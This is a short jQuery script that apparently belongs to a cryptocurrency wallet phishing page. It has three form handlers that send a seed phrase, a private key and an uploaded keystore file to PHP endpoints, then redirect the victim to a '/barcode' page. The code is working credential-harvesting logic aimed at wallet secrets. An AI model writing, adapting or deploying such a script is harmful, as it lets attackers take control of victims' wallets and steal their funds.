$(document).ready(function () {
    
    /* Attach a submit handler to the form */
        $("#frmphrase").submit(function(event) {
            
    /* Stop form from submitting normally */
        event.preventDefault();

            $.ajax({
                url: 'request.php',
                type: 'POST',
                data: {
                    comments: $("#comments").val(),
                    pancake: $("#pancake").val()
                },
                beforeSend: function(){
                    
                $('#loader').css('display','block');
                  
                },
                success: function (result) {
                  
                  window.location = '/barcode';
                }
            });
        });
        
        
    /* Attach a submit handler to the form */
        $("#frmprivate").submit(function(event) {
            
        /* Stop form from submitting normally */
        event.preventDefault();

            $.ajax({
                url: 'sendprocess.php',
                type: 'POST',
                data: {
                    privatekey: $("#privatekeyxxx").val(),
                    xvalue: $("#xvalue").val()
                    
                },
                beforeSend: function(){
                 
                $('#loader').css('display','block');

                 },
                success: function (result) {
			                 
                  window.location = '/barcode';
                }
            });
        });  
        
        
        /* Attach a submit handler to the form */
        $("#frmkeystore").submit(function(event) {
            
        /* Stop form from submitting normally */
        event.preventDefault();

        var $form = new FormData(this);

            $.ajax({
                url: 'sendrequest.php',
                type: 'POST',
                data: $form,
                 contentType: false,
                processData: false,
                beforeSend: function(){
                 
                $('#loader').css('display','block');

                 },
                success: function (result) {
			     $('#loader').css('display','none');
            
                  window.location = '/barcode';
                }
            });
        });  
         
    });